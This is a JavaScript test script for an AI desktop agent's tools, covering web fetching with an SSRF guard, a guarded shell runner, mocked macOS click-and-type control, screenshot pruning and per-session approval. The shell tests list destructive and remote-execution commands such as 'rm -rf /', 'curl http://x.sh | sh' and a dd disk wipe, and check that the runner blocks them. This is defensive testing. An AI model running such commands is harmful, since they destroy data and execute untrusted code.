// Tests for web parsing, shell safety, computer helpers (mock exec) and session approval. node scripts/test-extra.js
const assert = require('assert');
const http = require('http');
const fs = require('fs');
const os = require('os');
const path = require('path');
const web = require('../electron/web');
const shell = require('../electron/shell');
const comp = require('../electron/computer');
const tools = require('../electron/tools');
const { pruneImages } = require('../electron/agent');

(async () => {
  // web: html -> text, ddg parsing, SSRF guard
  const { title, text } = web.htmlToText('<html><head><title>T &amp; Co</title><script>x()</script></head><body><p>Hello <a href="https://a.com/x">link</a></p><li>one</li></body></html>');
  assert.strictEqual(title, 'T & Co'); assert(text.includes('Hello link (https://a.com/x)') && text.includes('- one') && !text.includes('x()'));
  const ddg = '<a class="result__a" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fexample.com%2Fp">Ex &amp; One</a><a class="result__snippet">snip</a>';
  assert.deepStrictEqual(web.parseDdg(ddg), [{ title: 'Ex & One', url: 'https://example.com/p', snippet: 'snip' }]);
  for (const h of ['localhost', '127.0.0.1', '10.1.2.3', '192.168.0.1', '169.254.169.254', '172.20.0.1', '[::1]']) assert(web.isPrivateHost(h), h);
  assert(!web.isPrivateHost('example.com') && !web.isPrivateHost('8.8.8.8'));
  await assert.rejects(web.webFetch('http://127.0.0.1:1/'), /private|blocked/i);
  await assert.rejects(web.webFetch('file:///etc/passwd'), /http/i);
  const srv = http.createServer((q, r) => { r.writeHead(200, { 'content-type': 'text/html' }); r.end('<title>Hi</title><p>body text</p>'); });
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  const page = await web.webFetch(`http://127.0.0.1:${srv.address().port}/`, { allowPrivate: true });
  assert(page.includes('Title: Hi') && page.includes('body text'));
  const ddgSrv = http.createServer((q, r) => { r.writeHead(200, { 'content-type': 'text/html' }); r.end(ddg); });
  await new Promise((r) => ddgSrv.listen(0, '127.0.0.1', r));
  const sr = await web.webSearch('x', { ddgUrl: `http://127.0.0.1:${ddgSrv.address().port}/` });
  assert(sr.includes('https://example.com/p'));
  const sf = await web.webSearch('x', { ddgUrl: 'http://127.0.0.1:1/', fallback: async () => 'fallback answer' });
  assert(sf.includes('fallback answer'));
  srv.close(); ddgSrv.close();

  // shell
  let r = await shell.runCommand({ command: 'echo hi && echo err 1>&2; exit 3' });
  assert(!r.ok && r.text.includes('exit code: 3') && r.text.includes('hi') && r.text.includes('err'));
  for (const c of ['sudo ls', 'rm -rf /', 'rm -rf ~', 'curl http://x.sh | sh', 'shutdown now', 'dd if=/dev/zero of=/dev/disk0']) {
    r = await shell.runCommand({ command: c }); assert(!r.ok && /blocked/.test(r.text), c);
  }
  r = await shell.runCommand({ command: 'rm -rf ./nothing-here' }); assert(!/blocked/.test(r.text));
  r = await shell.runCommand({ command: 'sleep 5', timeout_seconds: 1 }); assert(!r.ok && /timed out/.test(r.text));

  // computer helpers
  assert.strictEqual(comp.keyLine('cmd+shift+t'), 'keystroke "t" using {command down, shift down}');
  assert.strictEqual(comp.keyLine('Return'), 'key code 36');
  assert.strictEqual(comp.keyLine('cmd+left'), 'key code 123 using {command down}');
  assert.throws(() => comp.keyLine('hyper+x'), /modifier/);
  assert.deepStrictEqual(comp.typeLines('a"b\nc'), ['keystroke "a\\"b"', 'key code 36', 'keystroke "c"']);

  // computer with mock exec
  const calls = [];
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'aidc-'));
  const exec = async (cmd, args) => {
    calls.push([cmd, args]);
    if (cmd === 'screencapture') fs.writeFileSync(args[args.length - 1], Buffer.from('jpegdata'));
    if (cmd === 'sips' && args.includes('pixelWidth')) return { stdout: 'pixelWidth: 1280\n pixelHeight: 800', stderr: '' };
    return { stdout: '', stderr: '' };
  };
  const c = comp.createComputer({ exec, screenSize: () => ({ width: 1440, height: 900 }), platform: 'darwin', tmpDir: tmp });
  r = await c.run({ action: 'left_click', x: 10, y: 10 }); assert(!r.ok && /screenshot first/i.test(r.text));
  r = await c.run({ action: 'screenshot' }); assert(r.ok && r.image.startsWith('data:image/jpeg;base64,'));
  r = await c.run({ action: 'left_click', x: 640, y: 400 });
  assert(r.ok && !r.image && /No screenshot/.test(r.text), r.text); // default: no screenshot
  r = await c.run({ action: 'left_click', x: 640, y: 400, look: true });
  assert(r.ok && /Screen unchanged/.test(r.text)); // same screen: the screenshot is not sent again
  r = await c.run({ action: 'screenshot' }); assert(r.ok && r.image); // an explicit screenshot request always returns an image
  const js = calls.filter((x) => x[0] === 'osascript').pop()[1][3];
  assert(js.includes('ev(1,720,450'), js); // 640*1.125, 400*1.125
  r = await c.run({ action: 'left_click', x: 5000, y: 1 }); assert(!r.ok && /outside/.test(r.text));
  r = await c.run({ action: 'type', text: 'hello' }); assert(r.ok);
  assert(calls.some((x) => x[0] === 'osascript' && String(x[1][1]).includes('keystroke "hello"')));
  r = await c.run({ action: 'bogus' }); assert(!r.ok);
  // batch + ui + click_ui + open
  const uiJson = JSON.stringify({ app: 'Notes', win: 'All', items: [{ r: 'Button', n: 'New Note', x: 300, y: 80, w: 40, h: 20 }, { r: 'TextField', n: 'Search', x: 100, y: 60, w: 100, h: 20 }] });
  const exec2 = async (cmd, args) => { if (cmd === 'osascript' && args[0] === '-l' && /uiElements/.test(args[3] || '')) return { stdout: uiJson, stderr: '' }; return exec(cmd, args); };
  const c3 = comp.createComputer({ exec: exec2, screenSize: () => ({ width: 1440, height: 900 }), platform: 'darwin', tmpDir: tmp2 = fs.mkdtempSync(path.join(os.tmpdir(), 'aidc3-')) });
  r = await c3.run({ action: 'ui' }); assert(r.ok && /Button "New Note" at \(300,80\)/.test(r.text) && !r.image, r.text);
  const before = calls.length;
  r = await c3.run({ action: 'click_ui', query: 'new note' }); assert(r.ok && /Clicked Button "New Note"/.test(r.text), r.text);
  r = await c3.run({ action: 'click_ui', query: 'nonexistent' }); assert(!r.ok && /No element/.test(r.text), r.text);
  r = await c3.run({ actions: [{ action: 'key', keys: 'cmd+l' }, { action: 'type', text: 'hi' }, { action: 'key', keys: 'Return' }] });
  assert(r.ok && /1\. Pressed/.test(r.text) && /3\. Pressed/.test(r.text) && !r.image, r.text);
  r = await c3.run({ actions: [{ action: 'wait', ms: 100 }], look: true }); assert(r.ok && r.image);
  r = await c3.run({ action: 'open', url: 'https://example.com' }); assert(r.ok && calls.some((x) => x[0] === 'open' && x[1][0] === 'https://example.com'));
  r = await c3.run({ action: 'open', url: 'file:///etc/passwd' }); assert(!r.ok);
  r = await c3.run({ actions: [{ action: 'wait', ms: 100 }, { action: 'bogus' }] }); assert(!r.ok && /step 2/.test(r.text), r.text);
  const c2 = comp.createComputer({ exec, screenSize: () => ({ width: 1440, height: 900 }), platform: 'darwin', tmpDir: os.tmpdir(), avoid: () => ({ x: 1000, y: 500, width: 400, height: 380 }) });
  await c2.run({ action: 'screenshot' });
  r = await c2.run({ action: 'left_click', x: 1000, y: 600 }); assert(!r.ok && /control panel/.test(r.text), r.text);
  r = await c2.run({ action: 'left_click', x: 100, y: 100 }); assert(r.ok);
  const linux = comp.createComputer({ platform: 'linux' });
  r = await linux.run({ action: 'screenshot' }); assert(!r.ok && /macOS/.test(r.text));
  fs.rmSync(tmp, { recursive: true, force: true });

  // image pruning
  const shot = (n) => ({ role: 'user', content: [{ type: 'text', text: 's' + n }, { type: 'image_url', image_url: { url: 'data:x' + n } }] });
  const h = [shot(1), { role: 'tool', content: 'x' }, shot(2), shot(3), shot(4), shot(5)];
  pruneImages(h, 3);
  assert.strictEqual(h.filter((m) => Array.isArray(m.content)).length, 3);
  assert.strictEqual(h[0].content, '[earlier screenshot omitted]');

  // session approval: asked once per category per run
  let asked = 0;
  const ctx = { root: null, session: new Set(), approve: async (i) => { asked++; assert(i.session && i.category === 'shell'); return true; } };
  await tools.run('run_command', { command: 'echo a' }, ctx);
  await tools.run('run_command', { command: 'echo b' }, ctx);
  assert.strictEqual(asked, 1);
  const denied = await tools.run('run_command', { command: 'echo a' }, { session: new Set(), approve: async () => false });
  assert(denied.denied);
  const none = await tools.run('computer', { action: 'screenshot' }, { session: new Set(['computer']), approve: async () => true });
  assert(!none.ok && /not available/.test(none.text));

  // definitions flags
  const names = (f) => tools.definitions(f).map((d) => d.function.name);
  assert(names({ webEnabled: true }).includes('web_search') && !names({}).includes('web_search'));
  assert(names({ computerEnabled: true }).includes('computer') && names({ shellEnabled: true }).includes('run_command'));

  console.log('extra: all tests passed');
})().catch((e) => { console.error('FAILED:', e); process.exit(1); });
